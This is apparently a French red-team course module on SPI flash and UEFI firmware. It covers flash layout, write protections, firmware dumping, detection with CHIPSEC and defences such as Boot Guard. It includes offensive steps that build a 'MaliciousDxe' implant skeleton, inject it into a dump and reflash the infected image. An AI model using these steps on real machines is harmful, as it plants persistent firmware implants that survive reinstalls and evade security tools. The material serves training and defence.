# Module A08 : SPI Flash - Structure et attaques BIOS/UEFI

## Objectifs pédagogiques

À la fin de ce module, tu seras capable de :
- Comprendre l'architecture de la mémoire flash SPI
- Lire et modifier le firmware UEFI/BIOS
- Identifier les régions protégées et les contourner
- Implémenter des attaques de reflashing du firmware
- Détecter et défendre contre les implants firmware

## Prérequis

Avant de commencer ce module, assure-toi de maîtriser :
- Les bases du langage C (variables, fonctions, pointeurs)
- L'architecture UEFI (Module A06)
- Secure Boot et la chaîne de confiance (Module A07)
- Les protocoles de communication bas niveau (SPI, I2C)

---

## Introduction

### Qu'est-ce que la SPI flash ?

La **SPI flash** (Serial Peripheral Interface flash) est une puce mémoire non-volatile située sur la carte mère qui contient le firmware UEFI/BIOS de ton ordinateur.

```
┌──────────────────────────────────────────────────────────┐
│              Anatomie d'une carte mère                   │
└──────────────────────────────────────────────────────────┘

    CPU ──────────> Chipset (PCH)
                       │
                       ├─> RAM (DIMM slots)
                       ├─> PCIe (GPU, NVMe)
                       ├─> SATA (HDD/SSD)
                       ├─> USB Controllers
                       │
                       └─> SPI Flash (BIOS/UEFI) ← CIBLE
                             │
                             ├─> 8-16 MB typical
                             ├─> Contient le firmware
                             └─> Bootkit persistent possible
```

**Pourquoi c'est important en Red Team ?**

Si tu peux modifier la SPI flash, tu peux :
- Installer un **bootkit UEFI** invisible et persistant
- Survivre à une réinstallation complète de l'OS
- Contourner Secure Boot, TPM, et toutes les protections software
- Exécuter du code avant n'importe quel antivirus/EDR

**C'est la persistance ultime.**

---

## Partie 1 : Structure de la SPI flash

### Layout de la flash UEFI

Une SPI flash typique de 8-16 MB est divisée en plusieurs régions définies par le **Flash Descriptor**.

```
┌────────────────────────────────────────────────────────┐
│          Layout typique SPI Flash (8 MB)               │
└────────────────────────────────────────────────────────┘

0x000000  ┌──────────────────────────────────────┐
          │  Flash Descriptor (4 KB)              │
          │  ├─> Map des régions                  │
          │  ├─> Permissions d'accès              │
          │  └─> Master Access Section            │
0x001000  ├──────────────────────────────────────┤
          │  Management Engine (ME) Region        │
          │  ├─> Intel ME firmware (1-2 MB)       │
          │  └─> Autonome, ring -3                │
0x200000  ├──────────────────────────────────────┤
          │  BIOS Region (4-5 MB)                 │
          │  ├─> UEFI Firmware                    │
          │  ├─> DXE Drivers                      │
          │  ├─> PEI Modules                      │
          │  └─> NVRAM Variables (Secure Boot db) │
0x7F0000  ├──────────────────────────────────────┤
          │  Platform Data (PDR)                  │
          │  └─> Configuration OEM                │
0x800000  └──────────────────────────────────────┘
```

**Régions clés :**

| Région | Taille | Rôle | Protections typiques |
|--------|--------|------|---------------------|
| **Flash Descriptor** | 4 KB | Contrôle les accès | Read-only via HW |
| **ME Region** | 1-2 MB | Intel Management Engine | Lockée par ME |
| **BIOS Region** | 4-5 MB | Firmware UEFI | BIOS_WE, PR registers |
| **GbE Region** | 8 KB | Config Ethernet | Optionnel |
| **PDR** | Variable | Données OEM | Variable |

---

## Partie 2 : Le Flash Descriptor - Le gardien des permissions

### Qu'est-ce que le Flash Descriptor ?

Le **Flash Descriptor** est une structure de 4 KB au début de la SPI flash qui définit :
1. **Le layout** (où commence/finit chaque région)
2. **Les permissions d'accès** (qui peut lire/écrire chaque région)
3. **Les masters** (CPU, ME, GbE controller)

```
┌────────────────────────────────────────────────────────┐
│         Structure du Flash Descriptor                  │
└────────────────────────────────────────────────────────┘

Offset 0x00  : Descriptor Signature (0x0FF0A55A)
Offset 0x04  : Descriptor Map
Offset 0x10  : Component Section
               └─> Nombre de flash chips, densité

Offset 0x40  : Region Section
               ├─> Flash Descriptor    : 0x000000-0x000FFF
               ├─> BIOS Region         : 0x200000-0x7EFFFF
               ├─> ME Region           : 0x001000-0x1FFFFF
               └─> GbE Region          : (optionnel)

Offset 0x60  : Master Access Section ← CRITIQUE
               ├─> CPU/Host Access
               │   ├─> Read  : BIOS, Descriptor
               │   └─> Write : BIOS (si unlocked)
               │
               ├─> ME Access
               │   ├─> Read  : All regions
               │   └─> Write : ME, Descriptor
               │
               └─> GbE Access
                   └─> Read/Write : GbE region only
```

**Master Access Section :**

Détermine QUI peut accéder à QUOI. Exemple :

```c
// Pseudo-structure du Master Access
typedef struct {
    uint16_t cpu_read;   // Bitmap : quelles régions le CPU peut lire
    uint16_t cpu_write;  // Bitmap : quelles régions le CPU peut écrire
    uint16_t me_read;    // Bitmap : quelles régions le ME peut lire
    uint16_t me_write;   // Bitmap : quelles régions le ME peut écrire
} MASTER_ACCESS;

// Exemple de bits
#define FLASH_DESC_BIT  (1 << 0)
#define BIOS_BIT        (1 << 1)
#define ME_BIT          (1 << 2)
#define GBE_BIT         (1 << 3)

// Configuration typique (locked)
MASTER_ACCESS locked = {
    .cpu_read  = FLASH_DESC_BIT | BIOS_BIT,   // CPU peut lire Descriptor + BIOS
    .cpu_write = 0,                            // CPU ne peut rien écrire !
    .me_read   = FLASH_DESC_BIT | BIOS_BIT | ME_BIT,
    .me_write  = FLASH_DESC_BIT | ME_BIT       // ME peut tout modifier
};
```

**Conséquence offensive :**

Si le Descriptor interdit l'écriture CPU → impossible de reflasher depuis l'OS. Il faut :
1. Un programmeur hardware externe (CH341A, Bus Pirate)
2. Ou exploiter un bug dans le ME/firmware

---

## Partie 3 : Protections hardware de la SPI flash

### BIOS_WE - BIOS Write Enable

Contrôle si le CPU peut écrire dans la région BIOS via le chipset.

```c
// Registre BIOS Control (B_CN, offset 0xDC dans le LPC/eSPI config)
#define BIOS_WE   (1 << 0)  // BIOS Write Enable
#define BLE       (1 << 1)  // BIOS Lock Enable
#define BIOSWE    (1 << 2)  // BIOS Write Enable (autre nom)

// Vérifier l'état
uint8_t bios_ctrl = pci_read_byte(0, 31, 0, 0xDC);

if (bios_ctrl & BIOS_WE) {
    printf("BIOS_WE activé : écriture possible\n");
} else {
    printf("BIOS_WE désactivé : écriture bloquée\n");
}

if (bios_ctrl & BLE) {
    printf("BLE activé : BIOS_WE ne peut plus être modifié jusqu'au reboot\n");
}
```

**Attaque :**

Si `BIOS_WE=1` et `BLE=0` → On peut activer l'écriture et reflasher le BIOS depuis l'OS.

### Protected Range Registers (PR0-PR4)

Les **PR registers** définissent jusqu'à 5 plages mémoire protégées en écriture dans la SPI flash.

```
┌────────────────────────────────────────────────────────┐
│          Protected Range Registers                     │
└────────────────────────────────────────────────────────┘

PR0 = Base: 0x200000, Limit: 0x7FFFFF, Write Protected
      └─> Toute la région BIOS est protégée en écriture

PR1 = Base: 0x000000, Limit: 0x000FFF, Read/Write Protected
      └─> Flash Descriptor en lecture seule

PR2-PR4 = Non utilisés
```

**Code C pour lire les PR registers :**

```c
#include <stdio.h>
#include <stdint.h>
#include <pci/pci.h>  // libpci

#define SPI_BASE_ADDR 0xFED1F800  // Adresse MMIO du SPI controller

void dump_protected_ranges() {
    volatile uint32_t* spi = (volatile uint32_t*)SPI_BASE_ADDR;

    for (int i = 0; i < 5; i++) {
        uint32_t pr = spi[0x74/4 + i];  // PR0 à offset 0x74

        if (pr == 0) continue;

        uint32_t base  = (pr & 0x1FFF) << 12;
        uint32_t limit = ((pr >> 16) & 0x1FFF) << 12;
        int rp = (pr >> 31) & 1;  // Read Protected
        int wp = (pr >> 15) & 1;  // Write Protected

        printf("PR%d: 0x%08X - 0x%08X", i, base, limit);
        if (rp) printf(" [READ PROTECTED]");
        if (wp) printf(" [WRITE PROTECTED]");
        printf("\n");
    }
}

int main() {
    // Nécessite root pour accès MMIO
    dump_protected_ranges();
    return 0;
}
```

**Compilation :**
```bash
gcc -o dump_pr dump_pr.c -lpci
sudo ./dump_pr
```

---

## Partie 4 : Extraction et analyse du firmware

### Méthode 1 : Flashrom (software)

**Flashrom** est l'outil standard pour lire/écrire la SPI flash depuis l'OS.

```bash
# Lire le firmware (si non protégé)
sudo flashrom -p internal -r bios_dump.bin

# Analyser les protections
sudo flashrom -p internal --wp-status

# Exemple de sortie
# WP: status: 0x80
# WP: status.srp0: 1
# WP: write protect is enabled.
# WP: write protect range: start=0x00200000, len=0x00600000
```

**Si flashrom échoue** (protections activées) :

```
Error: Chip is in an unknown state.
Protection range: 0x200000-0x7FFFFF (BIOS region)
```

→ Passage obligatoire par hardware.

---

### Méthode 2 : Programmeur hardware (CH341A)

**Matériel nécessaire :**

- Programmeur CH341A (~5€ sur AliExpress)
- Pince SOIC8/SOIC16 (pour clip sur la puce sans dessouder)
- Logiciel : `flashrom` ou `AsProgrammer`

**Procédure :**

```
┌────────────────────────────────────────────────────────┐
│          Extraction hardware de la SPI flash           │
└────────────────────────────────────────────────────────┘

1. Identifier la puce SPI flash sur la carte mère
   └─> Chercher "25Q64" ou "W25Q128" (Winbond, Macronix, etc.)

2. Ouvrir le PC, localiser la puce (8 pins, SOIC8)
   Pinout SOIC8 typique :
   ┌─────────┐
   │1  CS   8│ VCC (3.3V)
   │2  MISO 7│ HOLD
   │3  WP   6│ CLK
   │4  GND  5│ MOSI
   └─────────┘

3. Clipper la pince SOIC8 sur la puce
   ⚠ ATTENTION : PC ÉTEINT et débranché !

4. Connecter au CH341A via USB

5. Lire le firmware
   flashrom -p ch341a_spi -r bios.bin

6. Vérifier l'intégrité (relire 2 fois)
   flashrom -p ch341a_spi -r bios2.bin
   diff bios.bin bios2.bin
```

**Schéma de connexion :**

```
PC (carte mère)              CH341A Programmer
┌───────────┐                ┌──────────────┐
│           │                │              │
│  ┌─────┐  │   SOIC8 Clip   │   ┌──────┐   │
│  │ SPI │<─┼────────────────┼───│ SOIC │   │
│  │Chip │  │                │   │Adapter   │
│  └─────┘  │                │   └──────┘   │
│           │                │      │       │
└───────────┘                │      USB     │
                             └──────┼───────┘
                                    │
                               ┌────▼────┐
                               │ Linux   │
                               │ flashrom│
                               └─────────┘
```

---

### Analyse du firmware avec UEFITool

**UEFITool** permet de parser et modifier les images UEFI.

```bash
# Installation
sudo apt install cmake qt5-default
git clone https://github.com/LongSoft/UEFITool.git
cd UEFITool && mkdir build && cd build
cmake .. && make
./UEFITool

# Ouvrir bios.bin
# → Parcourir l'arbre des modules DXE, PEI, etc.
```

**Exemple de structure visualisée :**

```
bios.bin
├─ Flash Descriptor
├─ ME Region
├─ BIOS Region
   ├─ SEC Core (Security Phase)
   ├─ PEI Core (Pre-EFI Initialization)
   │  ├─ PeiMain.efi
   │  └─ CpuPei.efi
   ├─ DXE Core (Driver Execution Environment)
   │  ├─ DxeCore.efi
   │  ├─ NTFS.efi
   │  ├─ FatPkg.efi
   │  └─ [⚠ Suspect] UnknownDxe.efi  ← Potentiel implant
   └─ BDS (Boot Device Selection)
```

**Extraire un module suspect :**

```bash
# UEFITool GUI : Clic droit sur le module → "Extract as is"
# Ou en ligne de commande avec UEFIExtract

UEFIExtract bios.bin
cd bios.bin.dump/
find . -name "UnknownDxe*"
```

---

## Partie 5 : Injection de DXE malveillant

### Qu'est-ce qu'un DXE driver ?

Les **DXE drivers** sont des modules UEFI qui s'exécutent pendant la phase DXE, **avant le bootloader**.

**Potentiel offensif :**

- Exécution avant Secure Boot
- Accès total au hardware
- Persistance maximale (dans le firmware)

### Créer un DXE malveillant basique

**Code source (MaliciousDxe.c) :**

```c
#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/DebugLib.h>

EFI_STATUS
EFIAPI
MaliciousDxeEntry(
    IN EFI_HANDLE        ImageHandle,
    IN EFI_SYSTEM_TABLE  *SystemTable
)
{
    // S'exécute au boot, avant l'OS

    // Exemple : Logger dans NVRAM pour prouver l'exécution
    CHAR16 MalwareMarker[] = L"INFECTED_BY_DXE_IMPLANT";
    EFI_GUID VendorGuid = {0x12345678, 0x1234, 0x5678, {0x90, 0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56, 0x78}};

    gRT->SetVariable(
        L"MalwareProof",
        &VendorGuid,
        EFI_VARIABLE_BOOTSERVICE_ACCESS | EFI_VARIABLE_RUNTIME_ACCESS | EFI_VARIABLE_NON_VOLATILE,
        sizeof(MalwareMarker),
        MalwareMarker
    );

    // Hook d'un protocol UEFI (exemple : hooker ReadKeyStroke pour keylogger)
    // ... (code complexe, voir module A09 pour les hooks)

    return EFI_SUCCESS;
}
```

**Compilation avec EDK II :**

```bash
# Installer EDK II
git clone https://github.com/tianocore/edk2.git
cd edk2
git submodule update --init

# Créer le package du DXE
# (Procédure complexe, voir ressources EDK II)

# Résultat : MaliciousDxe.efi
```

### Injection dans le firmware

**Méthode 1 : UEFITool (GUI)**

1. Ouvrir `bios.bin` dans UEFITool
2. Trouver une section DXE avec de l'espace libre
3. Clic droit → "Insert after..." → Sélectionner `MaliciousDxe.efi`
4. Sauvegarder : `File → Save image as → bios_infected.bin`

**Méthode 2 : UEFIPatch (CLI)**

```bash
# Créer un patch qui insère le DXE
cat > inject.txt <<EOF
find: 4D 5A 90 00  # Pattern dans le firmware
replace: <insertion de MaliciousDxe.efi>
EOF

# Appliquer
UEFIPatch bios.bin inject.txt bios_infected.bin
```

### Reflashing du firmware modifié

**Via CH341A (hardware) :**

```bash
# Vérifier que le fichier est valide
du -h bios_infected.bin
# Doit faire exactement la même taille que bios.bin

# Flasher
flashrom -p ch341a_spi -w bios_infected.bin

# Vérifier
flashrom -p ch341a_spi -v bios_infected.bin
```

**⚠ ATTENTION : Reflasher un firmware corrompu = BRICK de la carte mère !**

---

## Partie 6 : Détection d'implants firmware

### Indicateurs de compromission

**1. Comparaison avec un firmware de référence**

```bash
# Télécharger le firmware officiel du vendor
wget https://vendor.com/bios/update.bin -O official.bin

# Extraire (si capsule UEFI)
UEFIExtract official.bin

# Comparer avec le dump
diff -r official.bin.dump/ bios.bin.dump/
```

**Différences suspectes :**

- Modules DXE inconnus
- Tailles différentes
- Timestamps modifiés

**2. Analyse avec CHIPSEC**

```bash
# Installer CHIPSEC
git clone https://github.com/chipsec/chipsec.git
cd chipsec
sudo python setup.py install

# Vérifier l'intégrité du firmware
sudo chipsec_main -m common.bios_wp
sudo chipsec_main -m common.spi_lock
sudo chipsec_main -m common.bios_ts

# Exemple de sortie
# [!] BIOS region write protection is not enabled
# [!] SPI Flash Descriptor is not locked
```

**3. Hashing des modules critiques**

```bash
# Extraire tous les DXE
UEFIExtract bios.bin

# Hasher chaque module
find bios.bin.dump/ -name "*.efi" -exec sha256sum {} \;

# Comparer avec une baseline
diff hashes_baseline.txt hashes_current.txt
```

---

## Partie 7 : Défenses et protections

### Boot Guard (Intel) / Secure Boot (AMD)

**Intel Boot Guard** vérifie l'intégrité du firmware au démarrage via un hash stocké dans les **fuses** du CPU (OTP = One-Time Programmable).

```
┌────────────────────────────────────────────────────────┐
│          Intel Boot Guard - Chaîne de confiance        │
└────────────────────────────────────────────────────────┘

CPU (fuses OTP)
  │
  ├─> Hash du IBB (Initial Boot Block) stocké
  │
  └─> Au boot :
      1. CPU calcule hash(IBB) de la flash
      2. Compare avec le hash dans les fuses
      3. Si différent → HALT (PC ne boot pas)
      4. Si identique → Continue
```

**Bypass :**

Boot Guard est **très difficile** à contourner :

- Hash stocké dans les fuses (non modifiable)
- Vérification hardware (pas de software pour l'overrider)
- Seul contournement : hardware avancé (FIB, glitching)

**Vérifier Boot Guard :**

```bash
sudo chipsec_main -m common.bios_kbrd_buffer
```

---

### me_cleaner - Désactiver Intel ME

Le **ME** (Management Engine) a un accès complet à la SPI flash et au système. Certains le considèrent comme une backdoor.

**me_cleaner** permet de neutraliser partiellement le ME.

```bash
# Installer
git clone https://github.com/corna/me_cleaner.git
cd me_cleaner

# Nettoyer le ME dans un dump
python me_cleaner.py -S -O bios_clean.bin bios.bin

# -S : Soft disable (garde les fonctions critiques)
# -O : Output file

# Reflasher
flashrom -p ch341a_spi -w bios_clean.bin
```

**⚠ Risques :**

- Certaines fonctionnalités peuvent être perdues (AMT, vPro)
- Possible brick sur certains modèles récents

---

## Résumé

| Concept | Points clés |
|---------|-------------|
| **SPI Flash** | Mémoire 8-16 MB contenant le firmware UEFI/BIOS |
| **Flash Descriptor** | Contrôle les permissions d'accès (CPU, ME, GbE) |
| **Protections** | BIOS_WE, PR registers, Boot Guard |
| **Extraction** | Flashrom (software) ou CH341A (hardware) |
| **DXE Injection** | Implant firmware persistant, pré-OS |
| **Détection** | CHIPSEC, comparaison avec firmware officiel, hashing |
| **Défense** | Boot Guard, SPI lock, monitoring avec TPM |

**Progression logique :**

1. **A06_uefi_basics** : Comprendre UEFI
2. **A07_secure_boot** : Comprendre la chaîne de confiance
3. **A08_spi_flash** (ce module) : Attaquer le firmware à la source
4. **A09_bootkit_concepts** : Implémenter des bootkits MBR/UEFI
5. **A10_smm_basics** : Exploiter le Ring -2

## Ressources complémentaires

- **flashrom** : https://flashrom.org/
- **UEFITool** : https://github.com/LongSoft/UEFITool
- **CHIPSEC** : https://github.com/chipsec/chipsec
- **Intel Flash Descriptor** : https://www.intel.com/content/www/us/en/docs/programmable/683836/current/intel-fpga-flash-image-descriptor.html
- **me_cleaner** : https://github.com/corna/me_cleaner
- **EDK II** : https://github.com/tianocore/edk2

---

**Module suivant** : [Bootkit Concepts](../04-Bootkit-Concepts/)
